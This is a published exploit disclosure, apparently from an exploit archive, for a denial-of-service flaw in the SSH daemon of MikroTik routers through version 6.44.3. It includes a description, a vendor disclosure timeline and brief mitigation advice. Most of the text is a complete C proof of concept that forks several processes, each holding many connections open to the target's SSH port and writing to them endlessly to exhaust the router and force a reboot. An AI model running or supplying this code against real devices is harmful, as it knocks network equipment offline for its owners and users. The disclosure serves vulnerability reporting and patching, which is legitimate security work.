# Excploit Title: Microtik SSH Daemon 6.44.3 - Denial of Service (PoC)
# Author: Hosein Askari
# Date: 2020-03-18
# Vendor Homepage: https://mikrotik.com/
# Model: hAP lite
# Processor architecture: smips
# Affected Version: through 6.44.3
# CVE: N/A

#Description:
An uncontrolled resource consumption vulnerability in SSH daemon on MikroTik routers through v6.44.3 could allow remote attackers to generate CPU activity, trigger refusal of new authorized connections with SIGPIPE signal(SIGPIPE is the "broken pipe" signal, which is sent to a process when it attempts to write to a pipe whose read end has closed or when it attempts to write to a socket that is no longer open for reading. The default action is to terminate the process) and cause a reboot via connect and write system calls because of uncontrolled resource management.
#details:
The issue reported in 02/25/2020 to the Mikrotik
First response by Mikrotik in 02/26/2020
The additional information about exploit and PoC video sent in 02/26/2020
The vulnerability is accepted by "Reinis-Jānis S" from mikrotik security team in 02/27/2020 and asked for providing the CVE number and disclosure date
#PoC:
#Mitigation:
It can be mitigated with firewall filter and service port restrictions.
Solution:
Hardening and tuning the daemon for these 2 parameters:
1- Number of allowed unauthenticated connections to ssh daemon
2- Maximum number of connections at which we start dropping everything for ssh daemon
PoC:
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define MAX_CON 32
#define MAX_THREADS 16

int Socket(char *ip, char *port) {
    struct addrinfo hints, *ret, *p;
    int sock, r; 
    ssize_t bytes;
    char buffer[2048];
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if((r=getaddrinfo(ip, port, &hints, &ret))!=0) {
        return EXIT_FAILURE;
       }
    for(p = ret; p != NULL; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
            close(sock);
            continue;
        }
        break;
    }
    if(ret)
        freeaddrinfo(ret);
    fprintf(stderr, "ESTABLISHED  %s:%s\n", ip, port);
    return sock;
}

void signal_callback_handler(int signum){
        printf("Caught signal SIGPIPE %d\n",signum);
}

void mal(char *ip, char *port, int id) {
    int sockets[MAX_CON];
    int i, g=1, r;
    for(i=0; i!= MAX_CON; i++)
        sockets[i]=0;
    signal(SIGPIPE, signal_callback_handler);
    while(1) {
        for(i=0; i!= MAX_CON; i++) {
            if(sockets[i] == 0)
                sockets[i] = Socket(ip, port);
            r=write(sockets[i], "\0", 1);
            if(r == -1) {
                close(sockets[i]);
                sockets[i] = Socket(ip, port);
            }
        }
        usleep(200000);
    }
}

int main(int argc, char **argv) {
    int i;
    for(i=0; i!= MAX_THREADS; i++) {
        if(fork())
            mal(argv[1], argv[2], i);
        usleep(200000);
    }
    getc(stdin);
    return 0;
}
#########

Sincerely,
Hosein Askari